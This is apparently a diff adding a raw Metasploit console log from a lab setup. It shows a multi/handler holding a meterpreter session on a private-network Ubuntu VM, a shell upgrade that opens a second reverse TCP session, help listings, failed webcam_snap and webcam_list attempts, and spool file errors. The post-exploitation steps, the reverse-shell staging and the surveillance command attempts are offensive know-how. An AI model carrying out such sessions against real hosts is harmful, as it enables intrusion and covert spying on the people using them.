@@ -1,0 +1,478 @@
+[1m[34m[*][0m Spooling to file on...
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> spool on ~/Desktop/msf.txt[P[P[P~/Desktop/msf.txt[K?[Kbackground [P[P[P[Pexit -ysessions -C "sysinfo" -i 1exit -y[Ksessions -C "sysinfo" -i 1exit -y[Ksessions -C "sysinfo" -i 1exit -y[Ksessions -C "sysinfo" -i 1
+[0m[1m[34m[*][0m Running 'sysinfo' on meterpreter session 1 (192.168.204.129)
+[0mComputer        : ubuntu
+OS              : Linux 4.18.0-16-generic #17~18.04.1-Ubuntu SMP Tue Feb 12 13:35:51 UTC 2019
+Architecture    : x64
+System Language : en_US
+Meterpreter     : python/linux
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> exit -y
+[0m[1m[34m[*][0m Spooling to file on...
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> spool
+[0mUsage: spool <off>|<filename>
+
+Example:
+  spool /tmp/console.log
+
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> ls
+[0m[1m[34m[*][0m exec: ls
+
+app
+CODE_OF_CONDUCT.md
+config
+CONTRIBUTING.md
+COPYING
+CURRENT.md
+data
+db
+docker
+docker-compose.override.yml
+docker-compose.yml
+Dockerfile
+documentation
+external
+Gemfile
+Gemfile.local.example
+Gemfile.lock
+lib
+LICENSE
+LICENSE_GEMS
+metasploit-framework.gemspec
+modules
+msfconsole
+msfd
+msfdb
+msf-json-rpc.ru
+msfrpc
+msfrpcd
+msfupdate
+msfvenom
+msf-ws.ru
+on
+plugins
+Rakefile
+README.md
+script
+scripts
+spec
+test
+tools
+Vagrantfile
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> lsspool on[Kff
+[0m[1m[34m[*][0m Spooling to file on...
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> spool on | /root/Desktop/msf.txt[P[P[P[P[P/root/Desktop/msf.txtoff[Kls[K
+[0m[1m[34m[*][0m exec: ls
+
+app
+CODE_OF_CONDUCT.md
+config
+CONTRIBUTING.md
+COPYING
+CURRENT.md
+data
+db
+docker
+docker-compose.override.yml
+docker-compose.yml
+Dockerfile
+documentation
+external
+Gemfile
+Gemfile.local.example
+Gemfile.lock
+lib
+LICENSE
+LICENSE_GEMS
+metasploit-framework.gemspec
+modules
+msfconsole
+msfd
+msfdb
+msf-json-rpc.ru
+msfrpc
+msfrpcd
+msfupdate
+msfvenom
+msf-ws.ru
+on
+plugins
+Rakefile
+README.md
+script
+scripts
+spec
+test
+tools
+Vagrantfile
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> ?
+[0m
+Core Commands
+=============
+
+    Command       Description
+    -------       -----------
+    ?             Help menu
+    banner        Display an awesome metasploit banner
+    cd            Change the current working directory
+    color         Toggle color
+    connect       Communicate with a host
+    exit          Exit the console
+    get           Gets the value of a context-specific variable
+    getg          Gets the value of a global variable
+    grep          Grep the output of another command
+    help          Help menu
+    history       Show command history
+    load          Load a framework plugin
+    quit          Exit the console
+    repeat        Repeat a list of commands
+    route         Route traffic through a session
+    save          Saves the active datastores
+    sessions      Dump session listings and display information about sessions
+    set           Sets a context-specific variable to a value
+    setg          Sets a global variable to a value
+    sleep         Do nothing for the specified number of seconds
+    spool         Write console output into a file as well the screen
+    threads       View and manipulate background threads
+    unload        Unload a framework plugin
+    unset         Unsets one or more context-specific variables
+    unsetg        Unsets one or more global variables
+    version       Show the framework and console library version numbers
+
+
+Module Commands
+===============
+
+    Command       Description
+    -------       -----------
+    advanced      Displays advanced options for one or more modules
+    back          Move back from the current context
+    info          Displays information about one or more modules
+    loadpath      Searches for and loads modules from a path
+    options       Displays global options or for one or more modules
+    popm          Pops the latest module off the stack and makes it active
+    previous      Sets the previously loaded module as the current module
+    pushm         Pushes the active or list of modules onto the module stack
+    reload_all    Reloads all modules from all defined module paths
+    search        Searches module names and descriptions
+    show          Displays modules of a given type, or all modules
+    use           Selects a module by name
+
+
+Job Commands
+============
+
+    Command       Description
+    -------       -----------
+    handler       Start a payload handler as job
+    jobs          Displays and manages jobs
+    kill          Kill a job
+    rename_job    Rename a job
+
+
+Resource Script Commands
+========================
+
+    Command       Description
+    -------       -----------
+    makerc        Save commands entered since start to a file
+    resource      Run the commands stored in a file
+
+
+Database Backend Commands
+=========================
+
+    Command           Description
+    -------           -----------
+    analyze           Analyze database information about a specific address or address range
+    db_connect        Connect to an existing data service
+    db_disconnect     Disconnect from the current data service
+    db_export         Export a file containing the contents of the database
+    db_import         Import a scan result file (filetype will be auto-detected)
+    db_nmap           Executes nmap and records the output automatically
+    db_rebuild_cache  Rebuilds the database-stored module cache
+    db_remove         Remove the saved data service entry
+    db_save           Save the current data service connection as the default to reconnect on startup
+    db_status         Show the current data service status
+    hosts             List all hosts in the database
+    loot              List all loot in the database
+    notes             List all notes in the database
+    services          List all services in the database
+    vulns             List all vulnerabilities in the database
+    workspace         Switch between database workspaces
+
+
+Credentials Backend Commands
+============================
+
+    Command       Description
+    -------       -----------
+    creds         List all credentials in the database
+
+
+Developer Commands
+==================
+
+    Command       Description
+    -------       -----------
+    edit          Edit the current module or a file with the preferred editor
+    irb           Open an interactive Ruby shell in the current context
+    log           Display framework.log paged to the end if possible
+    pry           Open the Pry debugger on the current module or Framework
+    reload_lib    Reload Ruby library files from specified paths
+
+
+Exploit Commands
+================
+
+    Command       Description
+    -------       -----------
+    check         Check to see if a target is vulnerable
+    exploit       Launch an exploit attempt
+    rcheck        Reloads the module and checks if the target is vulnerable
+    recheck       Alias for rcheck
+    reload        Just reloads the module
+    rerun         Alias for rexploit
+    rexploit      Reloads the module and launches an exploit attempt
+    run           Alias for exploit
+
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> ?[Ksessions -[K-h
+[0mUsage: sessions [options] or sessions [id]
+
+Active session manipulation and interaction.
+
+OPTIONS:
+
+    -C <opt>  Run a Meterpreter Command on the session given with -i, or all
+    -K        Terminate all sessions
+    -S <opt>  Row search filter.
+    -c <opt>  Run a command on the session given with -i, or all
+    -d        List all inactive sessions
+    -h        Help banner
+    -i <opt>  Interact with the supplied session ID
+    -k <opt>  Terminate sessions by session ID and/or range
+    -l        List all active sessions
+    -n <opt>  Name or rename a session by ID
+    -q        Quiet mode
+    -s <opt>  Run a script or module on the session given with -i, or all
+    -t <opt>  Set a response timeout (default: 15)
+    -u <opt>  Upgrade a shell to a meterpreter session on many platforms
+    -v        List all active sessions in verbose mode
+    -w <opt>  Interact with Web Interface of the Supplied ID 
+    -x        Show extended information in the session table
+
+Many options allow specifying session ranges using commas and dashes.
+For example:  sessions -s checkvm -i 1,3-5  or  sessions -k 1-2,5,6
+
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> sessions -h[Ku
+[0m[1m[31m[-][0m Please specify valid session identifier(s)
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> sessions -u -i 1
+[0m[1m[31m[-][0m Please specify valid session identifier(s)
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> sessions -u -i 1[P[P[C[C 1[P1[P 1
+[0m[1m[34m[*][0m Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
+
+[1m[33m[!][0m SESSION may not be compatible with this module.
+[1m[34m[*][0m Upgrading session ID: 1
+[1m[34m[*][0m Starting exploit/multi/handler
+[1m[34m[*][0m Started reverse TCP handler on 192.168.204.133:4433 
+[1m[34m[*][0m Sending stage (985320 bytes) to 192.168.204.129
+[1m[34m[*][0m Meterpreter session 2 opened (192.168.204.133:4433 -> 192.168.204.129:39250) at 2019-03-17 23:15:40 -0700
+[0m[1m[34m[*][0m Command stager progress: 100.00% (773/773 bytes)
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> sessions -l
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                      Information                                                 Connection
+  --  ----  ----                      -----------                                                 ----------
+  1         meterpreter python/linux  dhawan291 @ ubuntu                                          192.168.204.133:4444 -> 192.168.204.129:52426 (192.168.204.129)
+  2         meterpreter x86/linux     uid=1000, gid=1000, euid=1000, egid=1000 @ 192.168.204.129  192.168.204.133:4433 -> 192.168.204.129:39250 (192.168.204.129)
+
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> [K[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> [K[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> [K[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> [K[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> sessions -l[K[K2
+[0m[1m[34m[*][0m Starting interaction with 2...
+
+[4mmeterpreter[0m > ?
+[0m
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bg                        Alias for background
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Open an interactive Ruby shell on the current session
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    migrate                   Migrate the server to another process
+    pry                       Open the Pry debugger on the current session
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establish session.
+    transport                 Change the current transport mechanism
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    cat           Read the contents of a file to the screen
+    cd            Change directory
+    checksum      Retrieve the checksum of a file
+    chmod         Change the permissions of a file
+    cp            Copy source to destination
+    dir           List files (alias for ls)
+    download      Download a file or directory
+    edit          Edit a file
+    getlwd        Print local working directory
+    getwd         Print working directory
+    lcd           Change local working directory
+    lls           List local files
+    lpwd          Print local working directory
+    ls            List files
+    mkdir         Make directory
+    mv            Move source to destination
+    pwd           Print working directory
+    rm            Delete the specified file
+    rmdir         Remove directory
+    upload        Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command       Description
+    -------       -----------
+    arp           Display the host ARP cache
+    getproxy      Display the current proxy configuration
+    ifconfig      Display interfaces
+    ipconfig      Display interfaces
+    netstat       Display the network connections
+    portfwd       Forward a local port to a remote service
+    resolve       Resolve a set of host names on the target
+    route         View and modify the routing table
+
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    execute       Execute a command
+    getenv        Get one or more environment variable values
+    getpid        Get the current process identifier
+    getuid        Get the user that the server is running as
+    kill          Terminate a process
+    localtime     Displays the target system's local date and time
+    pgrep         Filter processes by name
+    pkill         Terminate processes by name
+    ps            List running processes
+    shell         Drop into a system command shell
+    suspend       Suspends or resumes a list of processes
+    sysinfo       Gets information about the remote system, such as OS
+
+
+Stdapi: Webcam Commands
+=======================
+
+    Command        Description
+    -------        -----------
+    webcam_chat    Start a video chat
+    webcam_list    List webcams
+    webcam_snap    Take a snapshot from the specified webcam
+    webcam_stream  Play a video stream from the specified webcam
+
+
+Stdapi: Mic Commands
+====================
+
+    Command       Description
+    -------       -----------
+    listen        listen to a saved audio recording via audio player
+    mic_list      list all microphone interfaces
+    mic_start     start capturing an audio stream from the target mic
+    mic_stop      stop capturing audio
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command       Description
+    -------       -----------
+    play          play an audio file on target system, nothing written on disk
+
+[4mmeterpreter[0m > background 
+[0m[1m[34m[*][0m Backgrounding session 2...
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> sess`[Kions -w 1[K2
+[0m[1m[34m[*][0m Starting WebConsole the following session(s): 2
+[1m[34m[*][0m Starting Web Console for 2
+[1m[34m[*][0m Opening WebConsole on host http://0.0.0.0 on port 3002 for session 2
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> sessions -w 2[P[Pbackground ?[Ksessions 2-lu 1-i 1[Kh?[Klsspool on | /root/Desktop/msf.txt[P[P[P[P[P/root/Desktop/msf.txton | /root/Desktop/msf.txt[P[P[P[P[P/root/Desktop/msf.txtoff[Kls[Kspool onbackground [P[P[P[Pexit -ysessions -C "sysinfo" -i 1[P[P[P[P[P[P[Pw" -i 1e" -i 1b" -i 1c" -i 1a" -i 1," -i 1[Pm" -i 1_" -i 1s" -i 1n" -i 1a" -i 1p" -i 1
+[0m[1m[34m[*][0m Running 'webcam_snap' on meterpreter session 1 (192.168.204.129)
+[0m[1m[31m[-][0m Unknown command: webcam_snap.
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> sessions -C "webcam_snap" -i 1[C[P[P[P[Pl" -i 1i" -i 1s" -i 1t" -i 1
+[0m[1m[34m[*][0m Running 'webcam_list' on meterpreter session 1 (192.168.204.129)
+[0m[1m[31m[-][0m Unknown command: webcam_list.
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> spool
+[0mUsage: spool <off>|<filename>
+
+Example:
+  spool /tmp/console.log
+
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> spool /root/Desktop/msf.p[Ktxt
+[0m[1m[31m[-][0m Error while running command spool: Permission denied @ rb_sysopen - /root/Desktop/msf.txt
+
+Call stack:
+/home/dhawan291/git/metasploit-framework/lib/rex/ui/text/output/tee.rb:18:in `initialize'
+/home/dhawan291/git/metasploit-framework/lib/rex/ui/text/output/tee.rb:18:in `open'
+/home/dhawan291/git/metasploit-framework/lib/rex/ui/text/output/tee.rb:18:in `initialize'
+/home/dhawan291/git/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1087:in `new'
+/home/dhawan291/git/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1087:in `cmd_spool'
+/home/dhawan291/git/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:522:in `run_command'
+/home/dhawan291/git/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:473:in `block in run_single'
+/home/dhawan291/git/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:467:in `each'
+/home/dhawan291/git/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:467:in `run_single'
+/home/dhawan291/git/metasploit-framework/lib/rex/ui/text/shell.rb:151:in `run'
+/home/dhawan291/git/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
+/home/dhawan291/git/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
+./msfconsole:49:in `<main>'
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> spool /root/Desktop/msf.txt[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K/home/dhawan291/Desktop
+[0m[1m[31m[-][0m Error while running command spool: Is a directory @ rb_sysopen - /home/dhawan291/Desktop
+
+Call stack:
+/home/dhawan291/git/metasploit-framework/lib/rex/ui/text/output/tee.rb:18:in `initialize'
+/home/dhawan291/git/metasploit-framework/lib/rex/ui/text/output/tee.rb:18:in `open'
+/home/dhawan291/git/metasploit-framework/lib/rex/ui/text/output/tee.rb:18:in `initialize'
+/home/dhawan291/git/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1087:in `new'
+/home/dhawan291/git/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1087:in `cmd_spool'
+/home/dhawan291/git/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:522:in `run_command'
+/home/dhawan291/git/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:473:in `block in run_single'
+/home/dhawan291/git/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:467:in `each'
+/home/dhawan291/git/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:467:in `run_single'
+/home/dhawan291/git/metasploit-framework/lib/rex/ui/text/shell.rb:151:in `run'
+/home/dhawan291/git/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
+/home/dhawan291/git/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
+./msfconsole:49:in `<main>'
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> spool /home/dhawan291/Desktop/msf.txt
+[0m
